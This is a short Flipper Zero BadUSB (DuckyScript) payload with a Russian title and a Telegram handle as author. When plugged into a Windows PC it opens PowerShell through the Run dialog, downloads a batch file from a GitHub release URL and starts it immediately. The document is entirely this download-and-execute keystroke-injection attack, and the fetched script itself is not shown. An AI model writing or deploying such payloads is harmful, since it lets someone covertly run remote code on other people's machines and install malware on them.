# Скрипт для флиппера

REM Author: TG: FLUXSSSW
REM Description: TG: FLUXSSSW
REM Version: 1.5
DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri https://github.com/fluxsss/FLIPPER-ZERO-TEST-SCRIPT/releases/download/BETA/script.bat -OutFile script.bat; Start-Process script.bat
ENTER
